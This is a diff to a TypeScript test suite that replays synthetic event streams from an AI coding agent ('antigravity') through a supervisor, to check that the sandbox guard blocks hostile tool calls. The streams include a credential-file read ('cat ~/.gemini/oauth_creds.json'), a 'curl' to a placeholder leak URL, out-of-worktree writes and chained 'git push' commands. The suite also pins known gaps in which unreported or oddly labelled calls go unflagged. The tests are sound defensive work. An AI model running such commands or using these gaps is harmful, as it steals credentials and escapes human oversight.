@@ -3,7 +3,7 @@
  * no `agy` binary is run; probe output is the shape the 2026-10-14 live check recorded (`1.3.4`).
  */
 import { execFileSync } from "node:child_process";
-import { mkdirSync, mkdtempSync, readFileSync, realpathSync, rmSync, writeFileSync } from "node:fs";
+import { mkdirSync, mkdtempSync, readdirSync, readFileSync, realpathSync, rmSync, writeFileSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { join } from "node:path";
 import { Client } from "@modelcontextprotocol/sdk/client/index.js";
@@ -22,11 +22,11 @@ import { WorkspaceManager } from "../../workspace/index.js";
 import { auditInvocation, bypassClassFlags } from "../audit.js";
 import { type ConformanceCase, missingRequiredKinds, runConformanceCase, runConformanceSuite } from "../conformance.js";
 import { privilegedProfile, scopeShapes } from "../fixtures/privileged.js";
-import { REPLAY_SCRIPT } from "../fixtures/replay.js";
+import { REPLAY_SCRIPT, replayLauncher } from "../fixtures/replay.js";
 import { PreflightCache } from "../preflight-cache.js";
 import { providerEntry } from "../providers.js";
 import { AdapterRegistry } from "../registry.js";
-import { createProbeRunner } from "../run.js";
+import { createProbeRunner, startAdapterRun } from "../run.js";
 import { guardEvent } from "../tool-guard.js";
 import type {
   CompileRequest,
@@ -3327,6 +3327,216 @@ describe("antigravity malicious-fixture leg (T4.36, NFR-SEC-03, FR-POL-04, FR-PO
     expect(adapter().extractResult([flagged, ...events], EXIT0)).toMatchObject({
       ok: false,
       failureCode: "SANDBOX_VIOLATION",
+    });
+  });
+
+  // Residual pins (T4.36): the tests above fold lines in process; these replay the same hostile shapes through the
+  // supervisor (`startAdapterRun`) with the shared replay helper in place of `agy`, at exit 0 and exit 1, so the spawn
+  // path, the run's own guard context and the exit status take part in the verdict. Each stream is written to a temp
+  // directory, not to fixtures/, so the T4.35 fixture inventory is unchanged. SYNTHETIC lines; no `agy` is run.
+  describe("adapter replay through the supervisor (T4.36 residuals; SYNTHETIC streams)", () => {
+    const OUTSIDE = makeCwd();
+    writeFileSync(join(OUTSIDE, "sentinel.txt"), "outside\n");
+    // The replay helper refuses a stream without a SYNTHETIC provenance line (`requireSynthetic`).
+    const PROVENANCE = j({
+      _fixture: { synthetic: true, note: "SYNTHETIC: written by the T4.36 adapter replay residual tests" },
+    });
+    const INIT = j({
+      event: "init",
+      conversation_id: CID,
+      init: { cwd: "/work/tree", tools: ["run_command", "write_to_file"], permission_mode: "always-proceed" },
+    });
+    const step = (index: number, name: string, parameters: Record<string, string>) => [
+      j({
+        event: "step_update",
+        conversation_id: CID,
+        step_index: index,
+        state: "ACTIVE",
+        step_type: "tool",
+        tool_name: name,
+        tool_info: { name, parameters },
+      }),
+      j({ event: "step_update", conversation_id: CID, step_index: index, state: "DONE", step_type: "tool" }),
+    ];
+    const denied = (display: string) => result({ denied_actions: [{ action: "synthetic", display_name: display }] });
+    const PUSH = "git write attempted: `git push` can create commits, change refs or push";
+    const COMMIT = "git write attempted: `git commit` can create commits, change refs or push";
+    // [category, tool name, parameters, denial display name]
+    const HOSTILE: [string, string, Record<string, string>, string][] = [
+      ["credential read", "run_command", { command: "cat ~/.gemini/oauth_creds.json" }, "RunCommand"],
+      ["out-of-worktree write", "write_to_file", { path: join(OUTSIDE, "sentinel.txt") }, "WriteToFile"],
+      ["network call", "run_command", { command: "curl https://example.invalid/leak" }, "RunCommand"],
+    ];
+    // [category, shell command chained with a Git write, guard detail]
+    const GUARDED: [string, string, string][] = [
+      ["credential read", "cat ~/.gemini/oauth_creds.json && git push origin main", PUSH],
+      ["out-of-worktree write", `touch ${join(OUTSIDE, "sentinel.txt")} && git commit -am x`, COMMIT],
+      ["network call", "curl https://example.invalid/leak && git push origin main", PUSH],
+    ];
+    const atExits = <T extends unknown[]>(rows: T[]) =>
+      rows.flatMap((r) => [0, 1].map((x) => [x, ...r] as [number, ...T]));
+
+    /** Replays `lines` after a recorded-shape `init` under the supervisor; the checkout and outside sentinel must stay. */
+    const replay = async (lines: string[], exitCode: number) => {
+      const file = join(makeCwd(), "stream.jsonl");
+      writeFileSync(file, `${[PROVENANCE, INIT, ...lines].join("\n")}\n`);
+      const cwd = makeCwd();
+      writeFileSync(join(cwd, "README.md"), "hostile checkout\n");
+      const a = new AntigravityAdapter({
+        executable: process.execPath,
+        launcherArgs: replayLauncher("antigravity", file, ["--exit-code", String(exitCode)]),
+        timeouts: { wallClockMs: 10_000, idleMs: 2_000, killGraceMs: 300 },
+      });
+      const inv = a.compile(
+        request({
+          objective: "synthetic antigravity objective",
+          workspace: { cwd, writable: true },
+          bypassApproved: true,
+        }),
+        PRIVILEGED_BYPASS_PROFILE,
+      );
+      if (isIneligible(inv)) throw new Error(`ineligible: ${inv.reason}`);
+      const events: NormalizedEvent[] = [];
+      const outcome = await startAdapterRun(a, inv, {
+        profile: PRIVILEGED_BYPASS_PROFILE,
+        bypassApproved: true,
+        onEvent: (e) => events.push(e),
+      }).done;
+      expect(outcome.groupEmpty).toBe(true);
+      expect(readdirSync(cwd)).toEqual(["README.md"]);
+      expect(readFileSync(join(OUTSIDE, "sentinel.txt"), "utf8")).toBe("outside\n");
+      return { events, result: outcome.result };
+    };
+    const flagged = (events: NormalizedEvent[]) => events.filter((e) => e.kind === "tool_call" && e.violation);
+
+    it.each(atExits(HOSTILE))(
+      "at exit %i a soft-denied %s replays to PERMISSION_BLOCKED",
+      async (exitCode, _n, name, params, display) => {
+        const { events, result: r } = await replay([...step(1, name, params), denied(display)], exitCode);
+        expect(events.filter((e) => e.kind === "permission_denied")).toHaveLength(1);
+        expect(flagged(events)).toEqual([]);
+        expect(r).toEqual({
+          ok: false,
+          failureCode: "PERMISSION_BLOCKED",
+          failureDetail: `denied: ${display}`,
+          nativeSessionId: CID,
+          unknownEventCount: 0,
+        });
+      },
+    );
+
+    it.each(atExits(GUARDED))(
+      "at exit %i a %s chained with a Git write and no denial replays to PERMISSION_BLOCKED on the guard alone (ADR-0039)",
+      async (exitCode, _n, command, detail) => {
+        const { events, result: r } = await replay([...step(1, "run_command", { command }), result()], exitCode);
+        expect(events.some((e) => e.kind === "permission_denied")).toBe(false);
+        expect(flagged(events)).toHaveLength(1);
+        expect(r).toMatchObject({ ok: false, failureCode: "PERMISSION_BLOCKED", failureDetail: detail });
+        expect(r.nativeSessionId).toBe(CID);
+      },
+    );
+
+    it.each(atExits(GUARDED))(
+      "at exit %i a soft denial beside a guarded %s: the guard verdict names the detail",
+      async (exitCode, _n, command, detail) => {
+        const { result: r } = await replay([...step(1, "run_command", { command }), denied("RunCommand")], exitCode);
+        expect(r).toMatchObject({ ok: false, failureCode: "PERMISSION_BLOCKED", failureDetail: detail });
+      },
+    );
+
+    // The bypass gap through the real spawn path: no denial and no Git write leaves only the exit status to decide.
+    // If the exit 0 rows start failing, a control was added: update the T4.36 roadmap row.
+    it.each(HOSTILE)(
+      "bypass gap pinned through the replay: an unreported %s ends ok at exit 0",
+      async (_n, name, params) => {
+        const { events, result: r } = await replay([...step(1, name, params), result()], 0);
+        expect(flagged(events)).toEqual([]);
+        expect(r).toEqual({ ok: true, nativeSessionId: CID, unknownEventCount: 0 });
+      },
+    );
+
+    it.each(HOSTILE)(
+      "the same unreported %s at exit 1 is TOOL_FAILURE from the exit status, never PERMISSION_BLOCKED",
+      async (_n, name, params) => {
+        const { result: r } = await replay([...step(1, name, params), result()], 1);
+        expect(r).toMatchObject({ ok: false, failureCode: "TOOL_FAILURE", failureDetail: "exit code 1" });
+      },
+    );
+
+    it.each(HOSTILE)(
+      "an unflagged %s after the result line: OUTPUT_PROTOCOL_ERROR at exit 0, TOOL_FAILURE `exit code 1` at exit 1",
+      async (_n, name, params) => {
+        const at0 = await replay([result(), ...step(1, name, params)], 0);
+        expect(at0.result).toMatchObject({
+          ok: false,
+          failureCode: "OUTPUT_PROTOCOL_ERROR",
+          failureDetail: "tool call after the result line",
+        });
+        // The exit status outranks the trailing-call detail, which is only set for OUTPUT_PROTOCOL_ERROR.
+        const at1 = await replay([result(), ...step(1, name, params)], 1);
+        expect(at1.result).toMatchObject({ ok: false, failureCode: "TOOL_FAILURE", failureDetail: "exit code 1" });
+      },
+    );
+
+    it.each(atExits(GUARDED))(
+      "at exit %i a %s chained with a Git write after the result line replays to PERMISSION_BLOCKED",
+      async (exitCode, _n, command, detail) => {
+        const { result: r } = await replay([result(), ...step(1, "run_command", { command })], exitCode);
+        expect(r).toMatchObject({ ok: false, failureCode: "PERMISSION_BLOCKED", failureDetail: detail });
+      },
+    );
+
+    it.each(HOSTILE)(
+      "an unflagged %s with no result line: OUTPUT_PROTOCOL_ERROR at exit 0, TOOL_FAILURE at exit 1",
+      async (_n, name, params) => {
+        const at0 = await replay(step(1, name, params), 0);
+        expect(at0.result).toMatchObject({
+          ok: false,
+          failureCode: "OUTPUT_PROTOCOL_ERROR",
+          failureDetail: "no result event",
+        });
+        const at1 = await replay(step(1, name, params), 1);
+        expect(at1.result).toMatchObject({ ok: false, failureCode: "TOOL_FAILURE", failureDetail: "exit code 1" });
+      },
+    );
+
+    it.each(atExits(GUARDED))(
+      "at exit %i a %s chained with a Git write and no result line replays to PERMISSION_BLOCKED",
+      async (exitCode, _n, command, detail) => {
+        const { result: r } = await replay(step(1, "run_command", { command }), exitCode);
+        expect(r).toMatchObject({ ok: false, failureCode: "PERMISSION_BLOCKED", failureDetail: detail });
+      },
+    );
+
+    // Gap pinned: only a `step_update` with `step_type` `tool` reaches the guard (FR-ADP-04 reads nothing from an
+    // unrecognised shape), so a Git write inside an unknown event kind is counted unknown and never flagged. With a
+    // SUCCESS envelope at exit 0 the run ends ok. If this starts failing, update the T4.36 roadmap row.
+    it("gap pinned: a Git write inside unrecognised event kinds is only counted unknown; ok at exit 0, TOOL_FAILURE at exit 1", async () => {
+      const smuggled = [
+        j({ event: "tool_call", conversation_id: CID, command: "git push origin main" }),
+        j({
+          event: "Step_Update",
+          conversation_id: CID,
+          step_index: 1,
+          step_type: "tool",
+          tool_name: "run_command",
+          tool_info: { name: "run_command", parameters: { command: "git push origin main" } },
+        }),
+        j({
+          conversation_id: CID,
+          tool_info: { name: "run_command", parameters: { command: "git push origin main" } },
+        }),
+      ];
+      const at0 = await replay([...smuggled, result()], 0);
+      expect(at0.events.some((e) => e.kind === "tool_call")).toBe(false);
+      expect(at0.result).toEqual({ ok: true, nativeSessionId: CID, unknownEventCount: 3 });
+      const at1 = await replay([...smuggled, result()], 1);
+      expect(at1.result).toMatchObject({
+        ok: false,
+        failureCode: "TOOL_FAILURE",
+        failureDetail: "exit code 1",
+        unknownEventCount: 3,
+      });
     });
   });
 });
